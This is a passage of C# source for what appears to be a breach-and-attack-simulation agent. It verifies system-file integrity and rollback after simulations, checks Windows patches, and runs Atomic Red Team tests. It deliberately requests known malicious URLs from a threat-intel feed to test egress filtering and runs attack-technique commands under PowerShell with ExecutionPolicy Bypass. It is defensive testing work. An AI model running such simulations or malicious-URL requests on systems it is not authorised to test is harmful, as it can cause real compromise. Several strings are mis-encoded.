            foreach (var (fileName, baselineHash) in baseline.SystemFileHashes)
            {
                if (baselineHash is "UNREADABLE" or "ERROR") continue;
                try
                {
                    var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), fileName);
                    using var fs = File.OpenRead(path);
                    var hashBytes = System.Security.Cryptography.SHA256.HashData(fs);
                    var currentHash = BitConverter.ToString(hashBytes).Replace("-", "");
                    if (!currentHash.Equals(baselineHash, StringComparison.OrdinalIgnoreCase))
                        tamperedFiles.Add(fileName);
                }
                catch { }
            }

            if (tamperedFiles.Count > 0)
                return (CheckResult.Fail,
                    $"SHA-256 MISMATCH in {tamperedFiles.Count} core system file(s): {string.Join(", ", tamperedFiles)}. " +
                    "These files changed DURING the simulation â€” a critical indicator of EDR tampering, DLL injection, or an unclean simulation environment.",
                    "Run: Get-FileHash $env:SystemRoot\\System32\\ntdll.dll -Algorithm SHA256. " +
                    "If a simulation modified these files, it must be corrected immediately. Restore from known-good backup if necessary.");

            return (CheckResult.Pass,
                $"All {baseline.SystemFileHashes.Count} monitored core Windows binaries (ntdll, kernel32, amsi.dll etc.) have identical SHA-256 hashes before and after simulation. System file integrity confirmed clean.",
                "â€”");
        }) with { Severity = "Critical", ThreatImpact = "Attackers replace ntdll.dll or amsi.dll with patched versions to disable security telemetry. Verifying file hashes post-simulation ensures no tool altered the system defence layer." });

        // â”€â”€ 3. Temp Folder Artifact Cleanup Audit â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck("Temporary Folder Artifact Cleanup Audit", "T1074.001", async () =>
        {
            await Task.CompletedTask;
            string tempPath = Path.GetTempPath();
            var basFiles = Directory.GetFiles(tempPath, "bas_*.*", SearchOption.TopDirectoryOnly)
                                    .Select(Path.GetFileName)
                                    .ToList();

            if (basFiles.Count > 0)
            {
                var deleted  = new List<string>();
                var leftover = new List<string>();
                foreach (var f in basFiles)
                {
                    try { File.Delete(Path.Combine(tempPath, f!)); deleted.Add(f!); }
                    catch { leftover.Add(f!); }
                }

                if (leftover.Count > 0)
                    return (CheckResult.Fail,
                        $"{leftover.Count} simulation artifact file(s) in TEMP could NOT be auto-deleted: {string.Join(", ", leftover)}. " +
                        "An attacker staging files in %TEMP% is a well-known pre-execution technique.",
                        "Manually delete %TEMP%\\bas_*.* files. Enable DLP rules monitoring unexpected file creation in TEMP.");

                return (CheckResult.Pass,
                    $"Auto-deleted {deleted.Count} simulation staging file(s) from TEMP. Post-simulation cleanup is 100% complete.",
                    "â€”");
            }

            return (CheckResult.Pass,
                "No simulation artifact files (bas_*.*) found in TEMP. The environment is completely clean.",
                "â€”");
        }) with { Severity = "Medium", ThreatImpact = "Simulation tools that leave files in %TEMP% mirror real malware staging behaviour. Verifying cleanup ensures BAS runs are non-destructive and the endpoint is left in its original state." });

        // -- 4. Orchestrated Rollback (services, tasks, firewall, users) ─────────────
        cat.Checks.Add(await RunCheck("Orchestrated Artifact Rollback", "T1547.001", async () =>
        {
            var rollbackLog = await SimulationArtifactTracker.RollbackAll();
            int succeeded = rollbackLog.Count(l => l.StartsWith("[+]"));
            int failed    = rollbackLog.Count(l => l.StartsWith("[!]"));
            string detail = rollbackLog.Count == 0
                ? "No registered rollback actions — nothing to restore."
                : string.Join("; ", rollbackLog);
            if (failed > 0)
                return (CheckResult.Fail,
                    $"Rollback completed with {failed} failure(s). {succeeded} artifact(s) restored. Details: {detail}",
                    "Review the listed items and clean up manually. Ensure each simulation module " +
                    "registers its rollback via SimulationArtifactTracker.RegisterRollback().");
            return (CheckResult.Pass,
                $"All {succeeded} registered artifact(s) rolled back successfully. Endpoint state restored.",
                "—");
        }) with { Severity = "Critical",
                  ThreatImpact = "Unreversed simulation artifacts (services, tasks, firewall rules) are indistinguishable from real attacker persistence. A clean rollback is the fundamental guarantee of a non-destructive BAS platform." });

        // -- 5. Post-Rollback Clean State Validation ──────────────────────────────────
        cat.Checks.Add(await RunCheck("Post-Rollback Clean State Validation", "T1547.001", async () =>
        {
            var residue = await SimulationArtifactTracker.ValidateClean();
            if (residue.Count == 0)
                return (CheckResult.Pass,
                    $"Full validation passed. Registry, services, scheduled tasks, firewall rules, " +
                    $"local users, core DLL hashes, and watched directories all match the pre-simulation baseline.",
                    "—");
            return (CheckResult.Fail,
                $"{residue.Count} residual artifact(s) detected after rollback: {string.Join("; ", residue)}",
                "These artifacts were not cleaned up by the simulation. Investigate each item and " +
                "remove manually. Add explicit RegisterRollback() calls to the responsible simulation module.");
        }) with { Severity = "Critical",
                  ThreatImpact = "Any artifact remaining after simulation rollback represents a real persistence foothold an attacker could inherit. Zero residue is the required standard." });

        // -- 6. Simulation Artifact Audit Log ─────────────────────────────────────────
        cat.Checks.Add(await RunCheck("Simulation Artifact Audit Log", "T1562.002", async () =>
        {
            await Task.CompletedTask;
            var log = SimulationArtifactTracker.GetLog();
            if (log.Count == 0)
                return (CheckResult.Pass,
                    "No artifacts were explicitly logged during this simulation run. " +
                    "All changes were handled by scoped RegistrySnapshot/FileSnapshot blocks.",
                    "—");
            var byType = log.GroupBy(e => e.Type)
                            .Select(g => $"{g.Key}:{g.Count()}")
                            .ToList();
            return (CheckResult.Pass,
                $"{log.Count} artifact change(s) logged — {string.Join(", ", byType)}. " +
                "Full audit trail available for incident review.",
                "—");
        }) with { Severity = "Info",
                  ThreatImpact = "A complete artifact log enables forensic reconstruction of exactly what each simulation technique touched, providing evidence of non-destructiveness for compliance audits." });

        return cat;
    }

    // ============================================================
    // 12.  DYNAMIC THREAT INTELLIGENCE (CTI)
    // Tests: Real-time IOC proxying against DNS / HTTP filtering
    // ============================================================
    static async Task<SimulationCategory> Sim_12_DynamicThreatIntel()
    {
        var cat = new SimulationCategory { Name = "12. Dynamic Threat Intel", Phase = "Threat Intel" };

        List<CtiIoc> recentIocs = new();
        try
        {
            using var http = new HttpClient();
            http.DefaultRequestHeaders.Add("User-Agent", "BAS-Agent/1.0");
            var res = await http.GetAsync($"{ServerUrl}/api/cti/latest");
            if (res.IsSuccessStatusCode)
            {
                var json = await res.Content.ReadAsStringAsync();
                recentIocs = JsonSerializer.Deserialize<List<CtiIoc>>(json, new JsonSerializerOptions { PropertyNameCaseInsensitive = true }) ?? new();
            }
        }
        catch { }

        if (recentIocs.Count == 0)
        {
            cat.Checks.Add(new SimCheck
            {
                Name = "Fetch Latest IOCs",
                Result = CheckResult.Skipped,
                Details = "No Threat Intelligence payload could be reached from the BAS Server."
            });
            return cat;
        }

        foreach (var ioc in recentIocs)
        {
            if (ioc.Type == "url")
            {
                cat.Checks.Add(await RunCheck($"HTTP Request to C2/Payload: {ioc.Value}", "T1071.001", async () =>
                {
                    bool blocked = false;
                    try
                    {
                        using var httpTest = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
                        // Attack: Attempt to pull the malicious URL
                        var testRes = await httpTest.GetAsync(ioc.Value);
                        if (!testRes.IsSuccessStatusCode) blocked = true;
                    }
                    catch { blocked = true; } // Network drop / proxy denied / DNS blocked

                    if (blocked)
                        return (CheckResult.Pass, $"Connection to known malicious URL was blocked. Source: {ioc.Source}", "Ã¢â‚¬â€");
                    return (CheckResult.Fail, $"Connection to known malicious URL succeeded! Payload may have been downloaded.", "Block the IOC on the egress proxy or update Web Content Filtering rules immediately.");
                }));
            }
        }

        return cat;
    }

    // ============================================================
    // 11.  WINDOWS PATCH MANAGEMENT
    // Tests: Missing KBs, last patch date, Windows Update service
    // ============================================================
    static async Task<SimulationCategory> Sim_11_WindowsPatch()
    {
        var cat = new SimulationCategory { Name = "11. Windows Patch Management", Phase = "Patch Compliance" };

        // --- Check Windows Update service status ---
        cat.Checks.Add(await RunCheck("Windows Update service", "M1051", async () =>
        {
            bool wuRunning = IsServiceRunning("wuauserv");
            bool usoRunning = IsServiceRunning("UsoSvc");
            if (wuRunning || usoRunning)
                return (CheckResult.Pass, "Windows Update service (wuauserv/UsoSvc) is running.", "Ã¢â‚¬â€");
            return (CheckResult.Fail,
                JsonSerializer.Serialize(new {
                    patchStatus = "service_disabled",
                    missingKBs = Array.Empty<object>(),
                    lastPatchDate = "Unknown",
                    summary = "Windows Update service is disabled. Patches cannot be installed automatically."
                }),
                "Enable the Windows Update service (wuauserv) and set startup type to Automatic.");
        }));

        // --- Enumerate installed hotfixes and check recency ---
        cat.Checks.Add(await RunCheck("Missing security patches", "M1051", async () =>
        {
            var installedKBs = GetInstalledHotfixes();
            var lastDate     = GetLastPatchInstallDate();
            bool recentlyPatched = lastDate != null && (DateTime.UtcNow - lastDate.Value).TotalDays < 45;

            // Known critical KBs with CVE/threat context (recent 12-month catalogue)
            var criticalKBCatalogue = new[]
            {
                new { kb="KB5040527", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Jul 2024)",   severity="Critical", cve="CVE-2024-38080", threat="Windows Hyper-V Elevation of Privilege Ã¢â‚¬â€œ allows guest-to-host escape" },
                new { kb="KB5039212", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Jun 2024)",   severity="Critical", cve="CVE-2024-30080", threat="MSMQ Remote Code Execution Ã¢â‚¬â€œ unauthenticated attacker can execute arbitrary code" },
                new { kb="KB5037771", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (May 2024)",   severity="Critical", cve="CVE-2024-30051", threat="DWM Core Library Privilege Escalation Ã¢â‚¬â€œ used by QakBot malware" },
                new { kb="KB5036893", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Apr 2024)",   severity="Critical", cve="CVE-2024-26234", threat="Proxy Driver Spoofing Ã¢â‚¬â€œ allows malicious driver to bypass signature checks" },
                new { kb="KB5035853", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Mar 2024)",   severity="Critical", cve="CVE-2024-21407", threat="Hyper-V RCE Ã¢â‚¬â€œ specially crafted file triggers remote code execution on host" },
                new { kb="KB5034441", title="Security Update Ã¢â‚¬â€œ Windows Recovery Environment",  severity="Important", cve="CVE-2024-20666", threat="BitLocker Security Feature Bypass Ã¢â‚¬â€œ attacker with physical access can bypass encryption" },
                new { kb="KB5034122", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Jan 2024)",   severity="Critical", cve="CVE-2024-20674", threat="Kerberos Security Feature Bypass Ã¢â‚¬â€œ allows MITM to bypass authentication" },
                new { kb="KB5033372", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Dec 2023)",   severity="Critical", cve="CVE-2023-44487", threat="HTTP/2 Rapid Reset DDoS Ã¢â‚¬â€œ exploited actively at record scale" },
                new { kb="KB5032190", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Nov 2023)",   severity="Critical", cve="CVE-2023-36025", threat="SmartScreen Bypass Ã¢â‚¬â€œ zero-day used to deliver Phemedrone Stealer malware" },
                new { kb="KB5031354", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Oct 2023)",   severity="Critical", cve="CVE-2023-41763", threat="Skype for Business Information Disclosure Ã¢â‚¬â€œ leaks internal IP/port to attacker" },
                new { kb="KB5030219", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Sep 2023)",   severity="Critical", cve="CVE-2023-36802", threat="Streaming Service Proxy Elevation of Privilege Ã¢â‚¬â€œ actively exploited in wild" },
                new { kb="KB5029263", title="Cumulative Update Ã¢â‚¬â€œ Windows 10/11 (Aug 2023)",   severity="Critical", cve="CVE-2023-38180", threat=".NET / Visual Studio DoS Ã¢â‚¬â€œ unauthenticated denial-of-service in ASP.NET apps" },
            };

            var missingKBs = criticalKBCatalogue
                .Where(k => !installedKBs.Any(installed =>
                    installed.Contains(k.kb, StringComparison.OrdinalIgnoreCase)))
                .ToList();

            string lastPatchStr = lastDate.HasValue
                ? lastDate.Value.ToString("yyyy-MM-dd")
                : "Unknown";

            if (missingKBs.Count == 0 && recentlyPatched)
                return (CheckResult.Pass,
                    JsonSerializer.Serialize(new {
                        patchStatus = "up_to_date",
                        missingKBs = Array.Empty<object>(),
                        lastPatchDate = lastPatchStr,
                        summary = $"All monitored security patches are installed. Last patch date: {lastPatchStr}."
                    }),
                    "Ã¢â‚¬â€");

            // Build failure details
            var missingList = missingKBs.Select(k => new {
                k.kb, k.title, k.severity, k.cve, k.threat
            }).Cast<object>().ToList();

            string summaryText = missingKBs.Count > 0
                ? $"{missingKBs.Count} critical security patch(es) are missing."
                : $"Patches appear installed but last update date was {lastPatchStr} ({(int)(DateTime.UtcNow - (lastDate ?? DateTime.UtcNow)).TotalDays} days ago Ã¢â‚¬â€ over 45-day threshold)."
;
            return (CheckResult.Fail,
                JsonSerializer.Serialize(new {
                    patchStatus = "missing",
                    missingKBs = missingList,
                    lastPatchDate = lastPatchStr,
                    summary = summaryText
                }),
                "Run Windows Update immediately or use 'Install Patches' button to trigger automated update.");
        }));

        return cat;
    }

    // ============================================================
    // PATCH INSTALLATION: Real WUA COM via PowerShell subprocess
    // Reports each phase to the server so the dashboard stays live
    // even across page refreshes.
    // ============================================================
    static async Task InstallWindowsUpdates()
    {
        Console.WriteLine("[*] Starting Windows Update installation via WUA COM...");

        // PowerShell script: searches, downloads, installs via WUA COM
        // Writes progress tags that we parse from stdout in real-time
        const string ps1 = @"
$ErrorActionPreference = 'Stop'
try {
    $Session  = New-Object -ComObject Microsoft.Update.Session
    $Searcher = $Session.CreateUpdateSearcher()
    Write-Output 'PHASE:scanning'
    $Results = $Searcher.Search(""IsInstalled=0 AND Type='Software' AND IsHidden=0"")
    $Count = $Results.Updates.Count
    Write-Output ""FOUND:$Count""
    if ($Count -eq 0) { Write-Output 'PHASE:done'; Write-Output 'LOG:No pending updates found.'; exit 0 }
    $Downloader = $Session.CreateUpdateDownloader()
    $Downloader.Updates = $Results.Updates
    Write-Output 'PHASE:downloading'
    $null = $Downloader.Download()
    Write-Output 'PHASE:installing'
    $Installer = $Session.CreateUpdateInstaller()
    $Installer.Updates = $Results.Updates
    $ir = $Installer.Install()
    $rc = $ir.ResultCode   # 0=NotStarted 1=InProgress 2=Succeeded 3=SucceededWithErrors 4=Failed 5=Aborted
    if ($rc -eq 2 -or $rc -eq 3) {
        Write-Output ""PHASE:done""
        Write-Output ""LOG:$Count update(s) installed successfully (ResultCode=$rc). A reboot may be required.""
    } else {
        Write-Output 'PHASE:failed'
        Write-Output ""LOG:Installation failed with ResultCode=$rc.""
    }
} catch {
    Write-Output 'PHASE:failed'
    Write-Output ""LOG:$($_.Exception.Message)""
}
";
        // Write the script to a temp file
        var ps1Path = Path.Combine(Path.GetTempPath(), $"bas_wu_{AgentId}.ps1");
        await File.WriteAllTextAsync(ps1Path, ps1);

        await SetPatchPhase("scanning", "Searching for pending updates...");

        try
        {
            var psi = new ProcessStartInfo("powershell.exe",
                $"-ExecutionPolicy Bypass -NonInteractive -File \"{ps1Path}\"")
            {
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                Verb                   = "runas"   // ensure elevated
            };

            using var proc = Process.Start(psi)!;

            // Read stdout line by line and relay phase changes live
            while (!proc.StandardOutput.EndOfStream)
            {
                var line = await proc.StandardOutput.ReadLineAsync();
                if (string.IsNullOrEmpty(line)) continue;
                Console.WriteLine($"[WU] {line}");

                if (line.StartsWith("PHASE:"))
                {
                    var phase = line[6..];
                    string msg = phase switch
                    {
                        "scanning"    => "Searching Windows Update catalogue...",
                        "downloading" => "Downloading updates...",
                        "installing"  => "Installing updates (do not restart the machine)...",
                        "done"        => "All updates installed successfully.",
                        "failed"      => "Installation encountered an error.",
                        _             => phase
                    };
                    await SetPatchPhase(phase, msg);
                }
                else if (line.StartsWith("LOG:"))
                {
                    _patchLog = line[4..];
                    await ReportPatchStatus();
                }
                else if (line.StartsWith("FOUND:"))
                {
                    var n = line[6..];
                    await SetPatchPhase("downloading", $"{n} update(s) found. Downloading...");
                }
            }

            var stderr = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();

            if (!string.IsNullOrWhiteSpace(stderr))
                Console.Error.WriteLine($"[WU stderr] {stderr}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[!] WUA install failed: {ex.Message}");
            await SetPatchPhase("failed", $"Exception: {ex.Message}");
        }
        finally
        {
            try { File.Delete(ps1Path); } catch { }
        }

        // Re-run simulation so dashboard refreshes patch section
        await Task.Delay(2000);
        Console.WriteLine("[*] Re-running simulation after patch install...");
        await RunFullSimulation();
    }

    // Set phase + log, then push to server
    static async Task SetPatchPhase(string phase, string log)
    {
        _patchPhase = phase;
        _patchLog   = log;
        Console.WriteLine($"[Patch] Phase: {phase} Ã¢â‚¬â€ {log}");
        await ReportPatchStatus();
    }

    // POST patch status to server so it persists across page refreshes
    static async Task ReportPatchStatus()
    {
        try
        {
            using var http = new HttpClient();
            var payload = JsonSerializer.Serialize(new
            {
                agentId = AgentId,
                phase   = _patchPhase,
                log     = _patchLog
            });
            await http.PostAsync(
                $"{ServerUrl}/api/patch-status",
                new StringContent(payload, Encoding.UTF8, "application/json"));
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[!] ReportPatchStatus failed: {ex.Message}");
        }
    }

    // ============================================================
    // PATCH HELPERS
    // ============================================================
    static List<string> GetInstalledHotfixes()
    {
        var kbs = new List<string>();
        try
        {
            var psi = new ProcessStartInfo("wmic", "qfe list brief")
            {
                RedirectStandardOutput = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var proc = Process.Start(psi)!;
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(15000);
            // Each line contains a KB number like KB1234567
            foreach (var line in output.Split('\n'))
            {
                var match = System.Text.RegularExpressions.Regex.Match(line, @"KB\d+");
                if (match.Success) kbs.Add(match.Value);
            }
        }
        catch { /* wmic unavailable */ }

        // Also check registry-based update history
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages");
            if (key != null)
            {
                foreach (var name in key.GetSubKeyNames()
                             .Where(n => n.Contains("KB", StringComparison.OrdinalIgnoreCase)))
                {
                    var kbMatch = System.Text.RegularExpressions.Regex.Match(name, @"KB\d+");
                    if (kbMatch.Success && !kbs.Contains(kbMatch.Value))
                        kbs.Add(kbMatch.Value);
                }
            }
        }
        catch { }

        return kbs;
    }

    static DateTime? GetLastPatchInstallDate()
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\Results\Install");
            var raw = key?.GetValue("LastSuccessTime")?.ToString();
            if (!string.IsNullOrEmpty(raw) && DateTime.TryParse(raw, out var dt))
                return dt.ToUniversalTime();
        }
        catch { }
        return null;
    }

    // ============================================================
    // 15. ATOMIC RED TEAM (ART) SIMULATIONS
    // Executes every Windows-compatible atomic test from the
    // Atomic Red Team library (Red Canary / MITRE ATT&CK).
    // Place the 'atomics' folder next to the agent EXE.
    // Tests run via powershell.exe / cmd.exe (30-second timeout).
    // Cleanup commands are always run after each test.
    // Pass  = test was BLOCKED/prevented (exit != 0)
    // Fail  = test EXECUTED undetected   (exit == 0)
    // ============================================================
    static async Task Sim_15_AtomicRedTeam(SimulationCategory cat, Func<Task> flush)
    {
        cat.Name  = "15. Atomic Red Team (ART)";
        cat.Phase = "MITRE ATT&CK Full Coverage";

        // --- Locate the atomics directory alongside the agent EXE ---
        // Auto-discover any *master* folder beside BASAgent.exe containing ART YAML files
        string? artRoot = AutoDiscoverFramework("ART", new[] { "*.yaml" },
            c => c.Contains("atomic_tests:"));

        // Find the atomics sub-directory within the root (contains T1xxx technique folders)
        string? atomicsPath = null;
        if (artRoot != null)
        {
            var artSub = Path.Combine(artRoot, "atomics");
            atomicsPath = Directory.Exists(artSub) ? artSub
                : Directory.GetDirectories(artRoot, "*", SearchOption.AllDirectories)
                      .FirstOrDefault(d => Directory.GetDirectories(d)
                          .Any(s => System.Text.RegularExpressions.Regex.IsMatch(
                              Path.GetFileName(s), @"^T\d{4}")))
                  ?? artRoot;
            Console.WriteLine($"[ART] Atomics path: {atomicsPath}");
        }

        if (atomicsPath == null)
        {
            cat.Checks.Add(new SimCheck
            {
                Name        = "ART – Atomics folder not found",
                TechniqueId = "N/A",
                Result      = CheckResult.Skipped,
                Severity    = "Info",
                Details     = "No *master* folder containing Atomic Red Team YAML files found beside BASAgent.exe.",
                Remediation = "Place a folder with 'master' in its name (e.g. atomic-red-team-master) beside BASAgent.exe. It must contain the atomics/ directory with technique YAML files."
            });
            await flush();
            return;
        }

        Console.WriteLine($"[ART] Atomics path: {atomicsPath}");

        // --- YamlDotNet deserializer ---
        var deserializer = new DeserializerBuilder()
            .WithNamingConvention(UnderscoredNamingConvention.Instance)
            .IgnoreUnmatchedProperties()
            .Build();

        var techniqueDirs = Directory.GetDirectories(atomicsPath)
            .OrderBy(d => Path.GetFileName(d))
            .ToArray();

        int totalTechniques = techniqueDirs.Length;
        int techIndex = 0;
        int globalTestIndex = 0;
        int passCount = 0, failCount = 0, skipCount = 0;

        Console.WriteLine($"[ART] ════════════════════════════════════════════════════════");
        Console.WriteLine($"[ART] Atomic Red Team — {totalTechniques} technique directories found");
        Console.WriteLine($"[ART] Atomics path: {atomicsPath}");
        Console.WriteLine($"[ART] ════════════════════════════════════════════════════════");

        foreach (var techniqueDir in techniqueDirs)
        {
            string techniqueId = Path.GetFileName(techniqueDir);
            techIndex++;
            string yamlFile    = Path.Combine(techniqueDir, $"{techniqueId}.yaml");
            if (!File.Exists(yamlFile)) continue;

            ArtTechnique? technique = null;
            try
            {
                string yamlText = await File.ReadAllTextAsync(yamlFile);
                technique = deserializer.Deserialize<ArtTechnique>(yamlText);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ART]   ⚠ YAML parse error — skipped");
                skipCount++;
                cat.Checks.Add(new SimCheck
                {
                    Name        = $"[ART] {techniqueId} – YAML parse error",
                    TechniqueId = techniqueId,
                    Result      = CheckResult.Skipped,
                    Severity    = "Low",
                    Details     = $"Failed to parse {yamlFile}: {ex.Message}",
                    Remediation = "Verify the YAML file is a valid ART definition."
                });
                await flush();
                continue;
            }

            if (technique?.AtomicTests == null) continue;

            technique.Tactic = MitreTacticMap.Lookup(techniqueId);
            string techDisplayName = technique.DisplayName ?? techniqueId;
            int windowsTestCount = technique.AtomicTests.Count(t =>
                t.SupportedPlatforms != null &&
                t.SupportedPlatforms.Any(p => p.Equals("windows", StringComparison.OrdinalIgnoreCase)));
            Console.WriteLine($"[ART] ── [{techIndex}/{totalTechniques}] {techniqueId}: {techDisplayName} ({windowsTestCount} Windows tests) ──");

            int localTestIndex = 0;
            foreach (var test in technique.AtomicTests)
            {
                // Skip non-Windows tests
                if (test.SupportedPlatforms == null ||
                    !test.SupportedPlatforms.Any(p =>
                        p.Equals("windows", StringComparison.OrdinalIgnoreCase)))
                    continue;

                localTestIndex++;
                globalTestIndex++;

                // Skip manual-only tests (no command to run)
                if (test.Executor == null ||
                    string.IsNullOrWhiteSpace(test.Executor.Command) ||
                    test.Executor.Name.Equals("manual", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine($"[ART]     [{localTestIndex}/{windowsTestCount}] #{globalTestIndex} SKIP (manual) — {test.Name}");
                    skipCount++;
                    cat.Checks.Add(new SimCheck
                    {
                        Name        = $"[ART] {techniqueId} – {test.Name}",
                        TechniqueId = techniqueId,
                        Result      = CheckResult.Skipped,
                        Severity    = "Medium",
                        Details     = "Test requires manual execution (no automated command).",
                        Remediation = "Execute manually following the ART test guide."
                    });
                    await flush();
                    continue;
                }

                Console.WriteLine($"[ART]     [{localTestIndex}/{windowsTestCount}] #{globalTestIndex} EXEC — {test.Name} (via {test.Executor.Name})...");

                // Check dependencies (prerequisites) first
                bool prereqsMet = true;
                string prereqFailReason = "";
                if (test.Dependencies != null && test.Dependencies.Any())
                {
                    string depExecutor = test.DependencyExecutorName ?? "powershell";
                    foreach (var dep in test.Dependencies)
                    {
                        if (string.IsNullOrWhiteSpace(dep.PrereqCommand)) continue;

                        string checkCmd = dep.PrereqCommand;
                        checkCmd = checkCmd.Replace("PathToAtomicsFolder", atomicsPath);
                        if (test.InputArguments != null)
                        {
                            foreach (var (argName, argDef) in test.InputArguments)
                            {
                                string placeholder = $"#{{{argName}}}";
                                string defaultVal  = argDef?.Default?.ToString() ?? "";
                                defaultVal  = defaultVal.Replace("PathToAtomicsFolder", atomicsPath);
                                checkCmd = checkCmd.Replace(placeholder, defaultVal);
                            }
                        }

                        int checkExitCode = -1;
                        try
                        {
                            if (depExecutor.Equals("powershell", StringComparison.OrdinalIgnoreCase))
                            {
                                string scriptPath = Path.Combine(Path.GetTempPath(), $"art_prereq_{Guid.NewGuid():N}.ps1");
                                await File.WriteAllTextAsync(scriptPath, checkCmd);
                                var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{scriptPath}\"")
                                {
                                    CreateNoWindow = true, UseShellExecute = false
                                };
                                using var proc = Process.Start(psi)!;
                                await WaitOrKillAsync(proc, 15_000); // 15s timeout for prereq
                                checkExitCode = proc.HasExited ? proc.ExitCode : -1;
                                try { File.Delete(scriptPath); } catch { }
                            }
                            else
                            {
                                string batPath = Path.Combine(Path.GetTempPath(), $"art_prereq_{Guid.NewGuid():N}.bat");
                                await File.WriteAllTextAsync(batPath, "@echo off\r\n" + checkCmd);
                                var psi = new ProcessStartInfo("cmd.exe", $"/c \"{batPath}\"")
                                {
                                    CreateNoWindow = true, UseShellExecute = false
                                };
                                using var proc = Process.Start(psi)!;
                                await WaitOrKillAsync(proc, 15_000);
                                checkExitCode = proc.HasExited ? proc.ExitCode : -1;
                                try { File.Delete(batPath); } catch { }
                            }
                        }
                        catch { }

                        if (checkExitCode != 0)
                        {
                            prereqsMet = false;
                            prereqFailReason = dep.Description ?? "Required tool or configuration missing.";
                            break;
                        }
                    }
                }

                if (!prereqsMet)
                {
                    Console.WriteLine($"[ART]       → ○ SKIP (Missing Prerequisites: {prereqFailReason.Replace("\n", " ").Trim()})");
                    skipCount++;
                    cat.Checks.Add(new SimCheck
                    {
                        Name        = $"[ART] {techniqueId} – {test.Name}",
                        TechniqueId = techniqueId,
                        Result      = CheckResult.Skipped,
                        Severity    = "Info",
                        Details     = "Prerequisites not met. " + prereqFailReason,
                        Remediation = "Environment Misconfiguration: This test requires specific tools or roles (e.g. IIS, wmic) that are not present."
                    });
                    await flush();
                    continue;
                }

                // Resolve input argument defaults and PathToAtomicsFolder
                string command        = test.Executor.Command;
                string cleanupCommand = test.Executor.CleanupCommand ?? "";
                command        = command.Replace("PathToAtomicsFolder", atomicsPath);
                cleanupCommand = cleanupCommand.Replace("PathToAtomicsFolder", atomicsPath);

                if (test.InputArguments != null)
                {
                    foreach (var (argName, argDef) in test.InputArguments)
                    {
                        string placeholder = $"#{{{argName}}}";
                        string defaultVal  = argDef?.Default?.ToString() ?? "";
                        defaultVal  = defaultVal.Replace("PathToAtomicsFolder", atomicsPath);
                        command        = command.Replace(placeholder, defaultVal);
                        cleanupCommand = cleanupCommand.Replace(placeholder, defaultVal);
                    }
                }

                // Capture loop variables for closure
                string capturedTestName     = $"[ART] {techniqueId} – {test.Name}";
                string capturedTechId       = techniqueId;
                string capturedTechDisplay  = technique?.DisplayName ?? techniqueId;
                string capturedTactic       = technique?.Tactic ?? "";
                string capturedExecutor     = test.Executor.Name;
                string capturedCmd          = command;
                string capturedCleanup      = cleanupCommand;
                string capturedAtomicsPath  = atomicsPath;

                // Register cleanup as rollback safety net before execution
                if (!string.IsNullOrWhiteSpace(capturedCleanup))
                {
                    string rbCleanup = capturedCleanup;
                    SimulationArtifactTracker.RegisterRollback(
                        $"ART {capturedTechId} – {test.Name}",
                        async () =>
                        {
                            string p = Path.Combine(Path.GetTempPath(), $"bas_art_cleanup_{Guid.NewGuid():N}.ps1");
                            await File.WriteAllTextAsync(p, rbCleanup);
                            var psi2 = new ProcessStartInfo("powershell.exe",
                                $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{p}\"")
                                { CreateNoWindow = true, UseShellExecute = false,
                                  RedirectStandardOutput = true, RedirectStandardError = true };
                            using var proc2 = Process.Start(psi2)!;
                            await WaitOrKillAsync(proc2, 15_000);
                            try { File.Delete(p); } catch { }
                        });
                }
                SimulationArtifactTracker.LogArtifact(ArtifactType.Process, capturedTechId,
                    null, "executing", capturedTestName);

                cat.Checks.Add((await RunCheck(capturedTestName, capturedTechId, async () =>
                {
                    string detail      = "";
                    string remediation = $"Review ART test for {capturedTechId}. If blocked, controls are effective.";
                    CheckResult result;

                    try
                    {
                        if (capturedExecutor.Equals("powershell", StringComparison.OrdinalIgnoreCase))
                        {
                            // Write to temp .ps1 to avoid quoting issues
                            string scriptPath = Path.Combine(Path.GetTempPath(), $"bas_art_{Guid.NewGuid():N}.ps1");
                            await File.WriteAllTextAsync(scriptPath, capturedCmd);
                            var psi = new ProcessStartInfo("powershell.exe",
                                $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File \"{scriptPath}\"")
                            {
                                RedirectStandardOutput = true,
                                RedirectStandardError  = true,
                                UseShellExecute        = false,
                                CreateNoWindow         = true
                            };
                            using var proc = Process.Start(psi)!;
                            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
                            var stderrTask = proc.StandardError.ReadToEndAsync();
                            await WaitOrKillAsync(proc, 10_000);
                            string stdout  = await stdoutTask;
                            string stderr  = await stderrTask;
                            int exitCode   = proc.HasExited ? proc.ExitCode : -1;
                            string rawOut = "";
                            if (!string.IsNullOrWhiteSpace(stdout)) rawOut += stdout.Trim();
